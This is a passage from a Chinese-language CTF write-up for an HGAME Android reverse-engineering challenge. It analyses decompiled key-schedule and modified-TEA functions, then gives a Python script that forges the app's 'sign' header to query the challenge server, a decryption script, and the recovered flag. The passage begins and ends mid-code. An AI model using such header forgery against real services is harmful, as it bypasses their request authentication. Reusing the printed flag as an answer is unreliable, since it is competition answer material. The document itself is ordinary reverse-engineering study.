class="type">unsigned</span> <span class="type">int</span>)v7);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_18BB0</span><span class="params">(__int64 a1, __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+8h] [rbp-20h]</span></span><br><span class="line">  <span class="type">int</span> k; <span class="comment">// [rsp+Ch] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+10h] [rbp-18h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+14h] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line">  result = a1;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">4</span>; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt; <span class="number">16</span>; ++k )</span><br><span class="line">      &#123;</span><br><span class="line">        v3 = v4++;</span><br><span class="line">        *(_BYTE *)(a2 + v3) = k * j * i + (*(_BYTE *)(a1 + k) ^ (*(<span class="type">int</span> *)(a1 + <span class="number">36</span>) &gt;&gt; (<span class="number">8</span> * j)));	<span class="comment">//一个多层嵌套加密</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    result = (<span class="type">unsigned</span> <span class="type">int</span>)(i + <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">_DWORD *__fastcall <span class="title function_">sub_18C80</span><span class="params">(__int64 a1, __int64 a2, __int64 a3, <span class="type">int</span> a4)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+4h] [rbp-7Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v6; <span class="comment">// [rsp+8h] [rbp-78h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v7; <span class="comment">// [rsp+Ch] [rbp-74h]</span></span><br><span class="line">  _DWORD *v8; <span class="comment">// [rsp+10h] [rbp-70h]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [rsp+18h] [rbp-68h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-64h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+20h] [rbp-60h]</span></span><br><span class="line"></span><br><span class="line">  v9 = a4 / <span class="number">4</span>;</span><br><span class="line">  v8 = <span class="built_in">malloc</span>(a4);</span><br><span class="line">  __memset_chk(v8, <span class="number">0LL</span>, a4, <span class="number">-1LL</span>);</span><br><span class="line">  __memcpy_chk(v8, a2, a4, <span class="number">-1LL</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v9; i += <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = v8[i];</span><br><span class="line">    v6 = v8[i + <span class="number">1</span>];</span><br><span class="line">    v5 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">32</span>; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      v7 += v6 ^ (*(_DWORD *)(a3 + <span class="number">8LL</span> * j) + v5) ^ (v6 &gt;&gt; <span class="number">3</span>) ^ (<span class="number">4</span> * v6);</span><br><span class="line">      v6 += v7 ^ (*(_DWORD *)(a3 + <span class="number">4LL</span> * (<span class="number">2</span> * j + <span class="number">1</span>)) + v5) ^ (v7 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">16</span> * v7);			<span class="comment">//明显的TEA</span></span><br><span class="line">      v5 -= <span class="number">0x61C88647</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    v8[i] = v7;</span><br><span class="line">    v8[i + <span class="number">1</span>] = v6;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">_BYTE *__fastcall <span class="title function_">sub_18E20</span><span class="params">(__int64 a1, __int64 a2, <span class="type">int</span> a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE *v4; <span class="comment">// [rsp+10h] [rbp-40h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+18h] [rbp-38h]</span></span><br><span class="line"></span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  v4 = <span class="built_in">malloc</span>(<span class="number">2</span> * a3 + <span class="number">1LL</span>);</span><br><span class="line">  __memset_chk(v4, <span class="number">0LL</span>, <span class="number">2</span> * a3 + <span class="number">1LL</span>, <span class="number">-1LL</span>);</span><br><span class="line">  <span class="keyword">while</span> ( v5 &lt; a3 )</span><br><span class="line">  &#123;</span><br><span class="line">    v4[<span class="number">2</span> * v5] = *(_BYTE *)(a1 + (((<span class="type">int</span>)*(<span class="type">unsigned</span> __int8 *)(a2 + v5) &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0xF</span>) + <span class="number">17</span>);</span><br><span class="line">    v4[<span class="number">2</span> * v5 + <span class="number">1</span>] = *(_BYTE *)(a1 + (*(_BYTE *)(a2 + v5) &amp; <span class="number">0xF</span>) + <span class="number">17</span>);</span><br><span class="line">    ++v5;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>逐个分析b方法的加密过程，首先和上面的解密方法c使用了同样的密钥材料a，然后先在sub_18BB0用了一个三层嵌套的函数处理40字节的密钥材料a的前16字节，用后4字节循环256次处理前16字节，生成了64个dword作为后续加密的密钥，接着将输入的明文的每个字节重映射到S盒对应索引的对应字节值，然后再用TEA加密，加密的时候32轮一共带入64个dword，最终将加密结果的十六进制拆成两个字符并转为字符串然后输出，再查看附带的serve（远程服务端）的可执行文件中的decrypt函数，可以确定上述加密就是b方法对于明文的加密，用加密脚本加密adminhello（安卓程序中构造的sign请求头的值str1+str2），填充\x00至16字节，得到加密结果<font color=violet><strong>“41dce78c58dacf99cbbc2f1c20135745”</strong></font>，开启服务器，python构造请求脚本或启动程序按下按钮，发现都返回了同一串文本<font color=orange><strong>“4b181fd6f8b852a9e23a4a7776e5f6905b71341af8f194a5db07d2902d2655401322e1c9a1a90e0d8676809c08484762”</strong></font>，猜测是flag的密文，编写解密脚本解得flag：<font color=deepskyblue><strong>hgame{7be75491-2329-403b-9829-a8f042dd3ba0}</strong></font>.</p>
<p>模拟安卓程序的请求脚本：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">str1 = <span class="string">&quot;admin&quot;</span></span><br><span class="line">str2 = <span class="string">&quot;hello&quot;</span> </span><br><span class="line">str3 = <span class="string">&quot;xxxxx&quot;</span> </span><br><span class="line">url = <span class="string">f&quot;http://node1.hgame.vidar.club:<span class="subst">&#123;str3&#125;</span>/flag&quot;</span></span><br><span class="line"></span><br><span class="line">json_data = &#123;</span><br><span class="line">    <span class="string">&quot;username&quot;</span>: str1,</span><br><span class="line">    <span class="string">&quot;filename&quot;</span>: str2</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;sign&quot;</span>: <span class="string">&quot;41dce78c58dacf99cbbc2f1c20135745&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">response = requests.post(url, headers=headers, json=json_data)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(response.status_code)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure>
<p>输出结果：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">200</span></span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;code&quot;</span>:<span class="string">&quot;200&quot;</span>,<span class="string">&quot;msg&quot;</span>:<span class="string">&quot;4b181fd6f8b852a9e23a4a7776e5f6905b71341af8f194a5db07d2902d2655401322e1c9a1a90e0d8676809c08484762\n&quot;</span>&#125;.</span><br></pre></td></tr></table></figure>
<p>加解密脚本：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">bytes_to_dwords_little_endian</span>(<span class="params">byte_array</span>):</span><br><span class="line">    <span class="keyword">return</span> [<span class="built_in">int</span>.from_bytes(byte_array[i:i+<span class="number">4</span>], byteorder=<span class="string">&#x27;little&#x27;</span>, signed=<span class="literal">False</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(byte_array), <span class="number">4</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dwords_to_bytes_little_endian</span>(<span class="params">dword_array</span>):</span><br><span class="line">    byte_list = []</span><br><span class="line">    <span class="keyword">for</span> dword <span class="keyword">in</span> dword_array:</span><br><span class="line">        byte_list.extend(dword.to_bytes(<span class="number">4</span>, byteorder=<span class="string">&#x27;little&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> byte_list</span><br><span class="line"></span><br><span class="line"><span class="comment">#生成用于后续TEA加密的密钥的函数，用十六个字符的a1生成了64个四字</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">keygen</span>():</span><br><span class="line">    a1 = <span class="string">&quot;e7c10e42b7a68e14&quot;</span></span><br><span class="line">    hex_a2 = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">                ascii_val = <span class="built_in">ord</span>(a1[k]) ^ ((<span class="number">0x11223344</span> &gt;&gt; (<span class="number">8</span> * j)) &amp; <span class="number">0xFF</span>)</span><br><span class="line">                final_ascii_val = (ascii_val + (i * j * k)) &amp; <span class="number">0xFF</span></span><br><span class="line">                hex_a2.append(final_ascii_val)</span><br><span class="line">    key = bytes_to_dwords_little_endian(hex_a2)</span><br><span class="line">    <span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line">AES_sbox = [<span class="number">0x63</span>, <span class="number">0x7C</span>, <span class="number">0x77</span>, <span class="number">0x7B</span>, <span class="number">0xF2</span>, <span class="number">0x6B</span>, <span class="number">0x6F</span>, <span class="number">0xC5</span>, <span class="number">0x30</span>, <span class="number">0x01</span>, <span class="number">0x67</span>, <span class="number">0x2B</span>, <span class="number">0xFE</span>, <span class="number">0xD7</span>, <span class="number">0xAB</span>, <span class="number">0x76</span>, </span><br><span class="line">            <span class="number">0xCA</span>, <span class="number">0x82</span>, <span class="number">0xC9</span>, <span class="number">0x7D</span>, <span class="number">0xFA</span>, <span class="number">0x59</span>, <span class="number">0x47</span>, <span class="number">0xF0</span>, <span class="number">0xAD</span>, <span class="number">0xD4</span>, <span class="number">0xA2</span>, <span class="number">0xAF</span>, <span class="number">0x9C</span>, <span class="number">0xA4</span>, <span class="number">0x72</span>, <span class="number">0xC0</span>, </span><br><span class="line">            <span class="number">0xB7</span>, <span class="number">0xFD</span>, <span class="number">0x93</span>, <span class="number">0x26</span>, <span class="number">0x36</span>, <span class="number">0x3F</span>, <span class="number">0xF7</span>, <span class="number">0xCC</span>, <span class="number">0x34</span>, <span class="number">0xA5</span>, <span class="number">0xE5</span>, <span class="number">0xF1</span>, <span class="number">0x71</span>, <span class="number">0xD8</span>, <span class="number">0x31</span>, <span class="number">0x15</span>, </span><br><span class="line">            <span class="number">0x04</span>, <span class="number">0xC7</span>, <span class="number">0x23</span>, <span class="number">0xC3</span>, <span class="number">0x18</span>, <span class="number">0x96</span>, <span class="number">0x05</span>, <span class="number">0x9A</span>, <span class="number">0x07</span>, <span class="number">0x12</span>, <span class="number">0x80</span>, <span class="number">0xE2</span>, <span class="number">0xEB</span>, <span class="number">0x27</span>, <span class="number">0xB2</span>, <span class="number">0x75</span>, </span><br><span class="line">            <span class="number">0x09</span>, <span class="number">0x83</span>, <span class="number">0x2C</span>, <span class="number">0x1A</span>, <span class="number">0x1B</span>, <span class="number">0x6E</span>, <span class="number">0x5A</span>, <span class="number">0xA0</span>, <span class="number">0x52</span>, <span class="number">0x3B</span>, <span class="number">0xD6</span>, <span class="number">0xB3</span>, <span class="number">0x29</span>, <span class="number">0xE3</span>, <span class="number">0x2F</span>, <span class="number">0x84</span>, </span><br><span class="line">            <span class="number">0x53</span>, <span class="number">0xD1</span>, <span class="number">0x00</span>, <span class="number">0xED</span>, <span class="number">0x20</span>, <span class="number">0xFC</span>, <span class="number">0xB1</span>, <span class="number">0x5B</span>, <span class="number">0x6A</span>, <span class="number">0xCB</span>, <span class="number">0xBE</span>, <span class="number">0x39</span>, <span class="number">0x4A</span>, <span class="number">0x4C</span>, <span class="number">0x58</span>, <span class="number">0xCF</span>, </span><br><span class="line">            <span class="number">0xD0</span>, <span class="number">0xEF</span>, <span class="number">0xAA</span>, <span class="number">0xFB</span>, <span class="number">0x43</span>, <span class="number">0x4D</span>, <span class="number">0x33</span>, <span class="number">0x85</span>, <span class="number">0x45</span>, <span class="number">0xF9</span>, <span class="number">0x02</span>, <span class="number">0x7F</span>, <span class="number">0x50</span>, <span class="number">0x3C</span>, <span class="number">0x9F</span>, <span class="number">0xA8</span>, </span><br><span class="line">            <span class="number">0x51</span>, <span class="number">0xA3</span>, <span class="number">0x40</span>, <span class="number">0x8F</span>, <span class="number">0x92</span>, <span class="number">0x9D</span>, <span class="number">0x38</span>, <span class="number">0xF5</span>, <span class="number">0xBC</span>, <span class="number">0xB6</span>, <span class="number">0xDA</span>, <span class="number">0x21</span>, <span class="number">0x10</span>, <span class="number">0xFF</span>, <span class="number">0xF3</span>, <span class="number">0xD2</span>, </span><br><span class="line">            <span class="number">0xCD</span>, <span class="number">0x0C</span>, <span class="number">0x13</span>, <span class="number">0xEC</span>, <span class="number">0x5F</span>, <span class="number">0x97</span>, <span class="number">0x44</span>, <span class="number">0x17</span>, <span class="number">0xC4</span>, <span class="number">0xA7</span>, <span class="number">0x7E</span>, <span class="number">0x3D</span>, <span class="number">0x64</span>, <span class="number">0x5D</span>, <span class="number">0x19</span>, <span class="number">0x73</span>, </span><br><span class="line">            <span class="number">0x60</span>, <span class="number">0x81</span>, <span class="number">0x4F</span>, <span class="number">0xDC</span>, <span class="number">0x22</span>, <span class="number">0x2A</span>, <span class="number">0x90</span>, <span class="number">0x88</span>, <span class="number">0x46</span>, <span class="number">0xEE</span>, <span class="number">0xB8</span>, <span class="number">0x14</span>, <span class="number">0xDE</span>, <span class="number">0x5E</span>, <span class="number">0x0B</span>, <span class="number">0xDB</span>, </span><br><span class="line">            <span class="number">0xE0</span>, <span class="number">0x32</span>, <span class="number">0x3A</span>, <span class="number">0x0A</span>, <span class="number">0x49</span>, <span class="number">0x06</span>, <span class="number">0x24</span>, <span class="number">0x5C</span>, <span class="number">0xC2</span>, <span class="number">0xD3</span>, <span class="number">0xAC</span>, <span class="number">0x62</span>, <span class="number">0x91</span>, <span class="number">0x95</span>, <span class="number">0xE4</span>, <span class="number">0x79</span>, </span><br><span class="line">            <span class="number">0xE7</span>, <span class="number">0xC8</span>, <span class="number">0x37</span>, <span class="number">0x6D</span>, <span class="number">0x8D</span>, <span class="number">0xD5</span>, <span class="number">0x4E</span>, <span class="number">0xA9</span>, <span class="number">0x6C</span>, <span class="number">0x56</span>, <span class="number">0xF4</span>, <span class="number">0xEA</span>, <span class="number">0x65</span>, <span class="number">0x7A</span>, <span class="number">0xAE</span>, <span class="number">0x08</span>, </span><br><span class="line">            <span class="number">0xBA</span>, <span class="number">0x78</span>, <span class="number">0x25</span>, <span class="number">0x2E</span>, <span class="number">0x1C</span>, <span class="number">0xA6</span>, <span class="number">0xB4</span>, <span class="number">0xC6</span>, <span class="number">0xE8</span>, <span class="number">0xDD</span>, <span class="number">0x74</span>, <span class="number">0x1F</span>, <span class="number">0x4B</span>, <span class="number">0xBD</span>, <span class="number">0x8B</span>, <span class="number">0x8A</span>, </span><br><span class="line">            <span class="number">0x70</span>, <span class="number">0x3E</span>, <span class="number">0xB5</span>, <span class="number">0x66</span>, <span class="number">0x48</span>, <span class="number">0x03</span>, <span class="number">0xF6</span>, <span class="number">0x0E</span>, <span class="number">0x61</span>, <span class="number">0x35</span>, <span class="number">0x57</span>, <span class="number">0xB9</span>, <span class="number">0x86</span>, <span class="number">0xC1</span>, <span class="number">0x1D</span>, <span class="number">0x9E</span>, </span><br><span class="line">            <span class="number">0xE1</span>, <span class="number">0xF8</span>, <span class="number">0x98</span>, <span class="number">0x11</span>, <span class="number">0x69</span>, <span class="number">0xD9</span>, <span class="number">0x8E</span>, <span class="number">0x94</span>, <span class="number">0x9B</span>, <span class="number">0x1E</span>, <span class="number">0x87</span>, <span class="number">0xE9</span>, <span class="number">0xCE</span>, <span class="number">0x55</span>, <span class="number">0x28</span>, <span class="number">0xDF</span>, </span><br><span class="line">            <span class="number">0x8C</span>, <span class="number">0xA1</span>, <span class="number">0x89</span>, <span class="number">0x0D</span>, <span class="number">0xBF</span>, <span class="number">0xE6</span>, <span class="number">0x42</span>, <span class="number">0x68</span>, <span class="number">0x41</span>, <span class="number">0x99</span>, <span class="number">0x2D</span>, <span class="number">0x0F</span>, <span class="number">0xB0</span>, <span class="number">0x54</span>, <span class="number">0xBB</span>, <span class="number">0x16</span>]</span><br><span class="line"><span class="comment">#AES-S盒代换</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">AES_sbox_transform</span>(<span class="params">message,sbox</span>):</span><br><span class="line">    enc = [<span class="literal">None</span>]*<span class="built_in">len</span>(message)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(message)):</span><br><span class="line">        enc[i] = AES_sbox[<span class="built_in">ord</span>(message[i])]</span><br><span class="line">    <span class="built_in">print</span>([<span class="string">f&#x27;<span class="subst">&#123;byte:#02x&#125;</span>&#x27;</span> <span class="keyword">for</span> byte <span class="keyword">in</span> enc])</span><br><span class="line">    <span class="keyword">return</span> enc</span><br><span class="line"><span class="comment">#AES-S盒逆代换</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">AES_sbox_untransform</span>(<span class="params">enc,sbox</span>):</span><br><span class="line">    inv_AES_sbox = [<span class="literal">None</span>] * <span class="number">256</span></span><br><span class="line">    <span class="keyword">for</span> i, val <span class="keyword">in</span> <span class="built_in">enumerate</span>(AES_sbox):</span><br><span class="line">        inv_AES_sbox[val] = i</span><br><span class="line">    dec = [<span class="literal">None</span>]*<span class="built_in">len</span>(enc)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line">        dec[i] = inv_AES_sbox[enc[i]]</span><br><span class="line">    <span class="built_in">print</span>([<span class="string">f&#x27;<span class="subst">&#123;byte:#02x&#125;</span>&#x27;</span> <span class="keyword">for</span> byte <span class="keyword">in</span> dec])</span><br><span class="line">    <span class="keyword">return</span> dec</span><br><span class="line"><span class="comment">#魔改TEA</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">MyTEA</span>(<span class="params">enc, key</span>):</span><br><span class="line">    encm = bytes_to_dwords_little_endian(enc)</span><br><span class="line">    tenc = []</span><br><span class="line">    <span class="built_in">print</span>([<span class="string">f&#x27;<span class="subst">&#123;byte:#02x&#125;</span>&#x27;</span> <span class="keyword">for</span> byte <span class="keyword">in</span> encm])</span><br><span class="line">    m1 = []</span><br><span class="line">    m2 = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(encm), <span class="number">2</span>):</span><br><span class="line">        m1.append(encm[i])</span><br><span class="line">        m2.append(encm[i+<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">    loop = <span class="number">32</span> <span class="comment">#循环次数</span></span><br><span class="line">    num = <span class="number">0x9E3779B9</span> <span class="comment">#魔数</span></span><br><span class="line">    startsum = <span class="number">0</span> <span class="comment">#sum起始值</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(m1)):</span><br><span class="line">        delta = startsum</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(loop):</span><br><span class="line">            m1[i] = (m1[i] + (m2[i] ^ (key[<span class="number">2</span>*j] + delta) ^ (m2[i] &gt;&gt; <span class="number">3</span>) ^ (m2[i] &lt;&lt; <span class="number">2</span>))) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">            m2[i] = (m2[i] + (m1[i] ^ (key[<span class="number">2</span>*j+<span class="number">1</span>] + delta) ^ (m1[i] &gt;&gt; <span class="number">5</span>) ^ (m1[i] &lt;&lt; <span class="number">4</span>))) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">            delta = (delta + num) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        tenc.append(m1[i])</span><br><span class="line">        tenc.append(m2[i])</span><br><span class="line">    <span class="built_in">print</span>([<span class="string">f&#x27;<span class="subst">&#123;byte:#02x&#125;</span>&#x27;</span> <span class="keyword">for</span> byte <span class="keyword">in</span> tenc])</span><br><span class="line">    <span class="keyword">return</span> tenc</span><br><span class="line"><span class="comment">#解密魔改TEA</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">DeMyTEA</span>(<span class="params">enc, key</span>):</span><br><span class="line">    encm = bytes_to_dwords_little_endian(enc)</span><br><span class="line">    tenc = []</span><br><span class="line">    <span class="built_in">print</span>([<span class="string">f&#x27;<span class="subst">&#123;byte:#02x&#125;</span>&#x27;</span> <span class="keyword">for</span> byte <span class="keyword">in</span> encm])</span><br><span class="line">    m1 = []</span><br><span class="line">    m2 = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(encm), <span class="number">2</span>):</span><br><span class="line">        m1.append(encm[i])</span><br><span class="line">        m2.append(encm[i+<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">    loop = <span class="number">32</span> <span class="comment">#循环次数</span></span><br><span class="line">    num = <span class="number">0x9E3779B9</span> <span class="comment">#魔数</span></span><br><span class="line">    startsum = <span class="number">0</span> <span class="comment">#sum起始值</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(m1)):</span><br><span class="line">        delta = (loop * num + startsum) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(loop - <span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">            delta = (delta - num) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">            m2[i] = (m2[i] - (m1[i] ^ (key[<span class="number">2</span>*j+<span class="number">1</span>] + delta) ^ (m1[i] &gt;&gt; <span class="number">5</span>) ^ (m1[i] &lt;&lt; <span class="number">4</span>))) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">            m1[i] = (m1[i] - (m2[i] ^ (key[<span class="number">2</span>*j] + delta) ^ (m2[i] &gt;&gt; <span class="number">3</span>) ^ (m2[i] &lt;&lt; <span class="number">2</span>))) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        tenc.append(m1[i])</span><br><span class="line">        tenc.append(m2[i])</span><br><span class="line">    <span class="built_in">print</span>([<span class="string">f&#x27;<span class="subst">&#123;byte:#02x&#125;</span>&#x27;</span> <span class="keyword">for</span> byte <span class="keyword">in</span> tenc])</span><br><span class="line">    <span class="keyword">return</span> tenc</span><br><span class="line"></span><br><span class="line">key = keygen()</span><br><span class="line"></span><br><span class="line">message = <span class="string">b&quot;adminhello\x00\x00\x00\x00\x00\x00&quot;</span>.decode()</span><br><span class="line">enc = AES_sbox_transform(message,AES_sbox)</span><br><span class="line">tenc = MyTEA(enc,key)</span><br><span class="line">enc1 = 